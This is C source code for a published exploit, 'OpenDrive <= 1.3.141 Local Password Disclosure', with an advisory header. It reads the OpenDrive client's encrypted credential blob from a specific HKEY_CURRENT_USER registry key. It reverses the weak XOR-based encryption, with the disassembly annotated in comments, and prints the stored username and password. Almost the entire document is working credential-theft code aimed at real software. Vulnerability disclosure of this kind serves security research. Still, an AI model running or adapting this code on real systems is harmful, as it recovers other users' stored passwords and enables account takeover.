/*

Title: OpenDrive <= 1.3.141 Local Password Disclosure
Author(s): Glafkos Charalambous, George Nicolaou
Contact: glafkos[at]astalavista[dot]com, ishtus[at]astalavista[dot]com
Version: 1.3.141
Vendor: http://www.opendrive.com
Description: Authentication credentials used by the OpenDrive application are 
prone to local disclosure attacks due to a weak cryptographic algorithm implementation

Encrypted Values:
[HKEY_CURRENT_USER\CLSID\{6E830710-B00F-4bec-9BD7-F95C1F837D02}]
"Data1"=hex:6b,c3,24,c3,69,c3,6f,c3,00,00,04,c3,52,c3,01,c3,53,c3,00,c3,56,c3,0b,c3,54,c3,00,00

Decrypted Values:
Username: 0x41
Password: d3c0d3m3

*/

#include <stdio.h>
#include <wchar.h>
#include <windows.h>

int ReadRegistryKey( LPBYTE lpBuffer, LPDWORD lpBufferSize, HKEY hKey, 
					LPCTSTR lpszSubKey, LPCTSTR lpszValueName )
{
	HKEY hKeyLocal;
	int nType;
	if( RegOpenKeyEx(hKey, lpszSubKey, 0, KEY_READ, &hKeyLocal ) 
		== ERROR_SUCCESS ) {
		if( RegQueryValueEx( hKeyLocal, lpszValueName, 0, (LPDWORD)&nType,
			lpBuffer, lpBufferSize ) == ERROR_SUCCESS ) {
			return nType;
		}
		return -1;
	}
	return -1;
}

int GetRegistryValueSize( HKEY hKey, LPCTSTR lpszSubKey, LPCTSTR lpszValueName )
{
	HKEY hKeyLocal;
	unsigned long nSize;
	if( RegOpenKeyEx(hKey, lpszSubKey, 0, KEY_READ, &hKeyLocal ) == ERROR_SUCCESS ) {
		if( RegQueryValueEx( hKeyLocal, lpszValueName, 0, NULL, NULL, (LPDWORD)&nSize ) == ERROR_SUCCESS) {
			return (int)nSize;
		}
		return -1;
	}
	return -1;
}

void DecryptOpenDrive( unsigned short *ciphertxt, int len )
{
	short username[100] = {0};
	short password[100] = {0};
	
	int count = 0; // ECX
	int wchr = 0; // ESI
	int pos = 0; // EAX
	int round = 0; // EDX
	unsigned short tmp;
	short *output;
	output = (short *)&username;
	do {
		//00401626  |>  83F9 02       /CMP ECX,2
		//00401629  |.  7D 38         |JGE SHORT OpenDriv.00401663
		//0040162B  |.  0FB73453      |MOVZX ESI,WORD PTR DS:[EBX+EDX*2]
		//0040162F  |.  66:85F6       |TEST SI,SI
		//00401632  |.  75 0F         |JNZ SHORT OpenDriv.00401643
		if ( ( wchr = ciphertxt[round] ) ) {
			//00401643  |>  8D9A 5BC3FFFF |LEA EBX,DWORD PTR DS:[EDX-3CA5] // 0, 1
			tmp = round - 0x3CA5;
			//00401649  |.  33DE          |XOR EBX,ESI // ESI = ciph[0], ciph[1]
			tmp = tmp ^ (unsigned int)wchr;
			//0040164B  |.  8B748C 20     |MOV ESI,DWORD PTR SS:[ESP+ECX*4+20] 
			//0040164F  |.  66:891C46     |MOV WORD PTR DS:[ESI+EAX*2],BX // out[0] = BX
			*output++ = tmp;
			//00401653  |.  40            |INC EAX // 0 -> 1
		}
		else {
			count++;
			if(count >= 2) break;
			//00401634  |.  8B748C 20     |MOV ESI,DWORD PTR SS:[ESP+ECX*4+20]
			//00401638  |.  33DB          |XOR EBX,EBX
			//0040163A  |.  66:891C46     |MOV WORD PTR DS:[ESI+EAX*2],BX
			*output = 0;
			output = (short *)&password;
			//0040163E  |.  41            |INC ECX
			//0040163F  |.  33C0          |XOR EAX,EAX
		}
		round++;
	} 
	while(1); 
	wprintf(L"Username: %ls\nPassword: %ls\n",username, password);
}

int main() {
	int nRegistryKeySize;
	LPBYTE buffer;
	if ( (nRegistryKeySize = GetRegistryValueSize( HKEY_CURRENT_USER, TEXT("CLSID\\{6E830710-B00F-4bec-9BD7-F95C1F837D02}"), TEXT("Data1") ) ) != -1 ) {
		buffer = (LPBYTE)calloc( nRegistryKeySize, sizeof(char) );
		if( ReadRegistryKey(buffer, (LPDWORD)&nRegistryKeySize, HKEY_CURRENT_USER, TEXT("CLSID\\{6E830710-B00F-4bec-9BD7-F95C1F837D02}"), TEXT("Data1") ) != -1 ) {
			DecryptOpenDrive( (unsigned short *)buffer, nRegistryKeySize );
		}
		else {
		wprintf(L"Error reading registry key\n");
		}
	}
}
